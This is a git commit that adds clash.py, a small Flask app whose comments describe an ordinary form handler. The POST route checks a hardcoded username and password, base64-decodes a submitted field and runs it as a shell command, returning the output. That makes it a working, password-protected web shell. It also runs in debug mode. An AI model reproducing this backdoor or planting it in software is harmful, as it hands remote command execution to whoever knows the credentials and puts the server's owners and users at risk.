69c6bc9b1b2af4a7373197ce4afe098f1f3edbe2
wwl995 <57948674+wwl995@users.noreply.github.com>
2023-11-09 20:35:04 +0800

    Create clash.py

---
+++ clash.py
@@ -0,0 +1,32 @@
+from flask import Flask, request, render_template
+import os, subprocess, base64
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    # 显示一个简单的表单，让用户输入一些数据
+    return render_template('form.html')
+
+@app.route('/', methods=['POST'])
+def process_form():
+    # 处理表单提交的数据
+    c = request.form['c']
+    u = request.form['u']
+    p = request.form['p']
+    if u == "wwl" and p == "wwl":
+        # 打印输出数据
+        c = base64.b64decode(c)
+        print('c:', c)
+        # 返回一个响应给用户，告诉他们数据已经处理完毕
+        
+        # 执行Linux命令，并将输出内容存储在result变量中
+        result = subprocess.run(c, shell=True, capture_output=True, text=True)
+        # 输出命令的输出内容
+        print(result.stdout)
+        # 输出错误输出内容
+        print(result.stderr)
+        return result.stdout + result.stderr
+
+if __name__ == '__main__':
+    app.run(debug=True)
